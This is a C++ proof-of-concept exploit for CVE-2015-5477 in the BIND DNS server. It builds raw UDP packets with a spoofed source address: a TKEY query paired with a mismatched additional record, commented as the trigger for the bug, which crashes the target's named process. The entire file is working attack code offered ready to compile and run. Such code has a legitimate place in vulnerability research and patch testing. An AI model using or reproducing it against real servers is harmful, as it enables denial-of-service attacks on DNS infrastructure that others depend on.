// bind CVE-2015-5477 PoC, requires libusi++: https://github.com/stealth/libusipp
// c++ dns-tkey.cc -lusi++ -ldnet -lpcap -std=c++11

#include <string>
#include <iostream>
#include <usi++/usi++.h>
#include <stdlib.h>
#include <cstdint>

class dnshdr {
public:
	uint16_t id;

#if __BYTE_ORDER == __BIG_ENDIAN
                        /* fields in third byte */
        uint16_t        qr: 1;          /* response flag */
        uint16_t        opcode: 4;      /* purpose of message */
        uint16_t        aa: 1;          /* authoritive answer */
        uint16_t        tc: 1;          /* truncated message */
        uint16_t        rd: 1;          /* recursion desired */
                        /* fields in fourth byte */
        uint16_t        ra: 1;          /* recursion available */
        uint16_t        unused :1;      /* unused bits (MBZ as of 4.9.3a3) */
        uint16_t        ad: 1;          /* authentic data from named */
        uint16_t        cd: 1;          /* checking disabled by resolver */
        uint16_t        rcode :4;       /* response code */
#endif
#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
                        /* fields in third byte */
        uint16_t        rd :1;          /* recursion desired */
        uint16_t        tc :1;          /* truncated message */
        uint16_t        aa :1;          /* authoritive answer */
        uint16_t        opcode :4;      /* purpose of message */
        uint16_t        qr :1;          /* response flag */
                        /* fields in fourth byte */
        uint16_t        rcode :4;       /* response code */
        uint16_t        cd: 1;          /* checking disabled by resolver */
        uint16_t        ad: 1;          /* authentic data from named */
        uint16_t        unused :1;      /* unused bits (MBZ as of 4.9.3a3) */
        uint16_t        ra :1;          /* recursion available */
#endif
	uint16_t q_count;
	uint16_t a_count;
	uint16_t rra_count;
	uint16_t ad_count;

	dnshdr() : id (0),
	           q_count(0), a_count(0), rra_count(0), ad_count(0)
	{
		qr = 0; opcode = 0; aa = 0; tc = 0; rd = 0; ra = 0; ad = 0; cd = 0;
		rcode = 0; unused = 0;
	}

	private: dnshdr(const dnshdr &) {};
};



enum dns_type : uint16_t {
	A	=	1,
	NS	=	2,
	CNAME	=	5,
	SOA	=	6,
	PTR	=	12,
	HINFO	=	13,
	MX	=	15,
	TXT	=	16,
	AAAA	=	28,
	SRV	=	33,
	DNAME	=	39,
	OPT	=	41,
	DNSKEY	=	48,
	EUI64	=	109,
	TKEY	=	249
};


// an IPv4 RR
struct dns_rr {
	// name here
	uint16_t type, _class;
	uint32_t ttl;
	uint16_t len;
	// rdata
} __attribute__((packed));


struct q_section {
	// encoded name here
	uint16_t qtype, qclass;
} __attribute__((packed)) da_Q = {
	htons(dns_type::TKEY), htons(1)
};


using namespace std;
using namespace usipp;


int main(int argc, char **argv)
{

	if (argc < 2) {
		cout<<argv[0]<<" [src IP] [dst IP]\n";
		exit(1);
	}
	UDP4 udp(argv[2]);
        udp.set_srcport(53);
	udp.set_dstport(53);
	udp.set_src(argv[1]);

	dnshdr dhdr;
	dns_rr rr1;

	dhdr.q_count = htons(1);
	dhdr.ad_count = htons(1);

	string sndbuf = string(reinterpret_cast<char *>(&dhdr), sizeof(dhdr));

	// construct question section
	sndbuf += string("\3foo\0", 5);	// QNAME
	da_Q.qtype = htons(dns_type::TKEY);
	da_Q.qclass = htons(1);
	sndbuf += string(reinterpret_cast<char *>(&da_Q), sizeof(da_Q));

	// 1 additional answer RR
	sndbuf += string("\3foo\0", 5);	// QNAME to refer to
	rr1.type = htons(dns_type::A);	// non-TKEY type to trigger bug
	rr1._class = htons(1);
	rr1.ttl = htons(31337);
	rr1.len = htons(4);
	sndbuf += string(reinterpret_cast<char *>(&rr1), sizeof(rr1));
	sndbuf += "abcd";

	udp.sendpack(sndbuf);

        return 0;
}

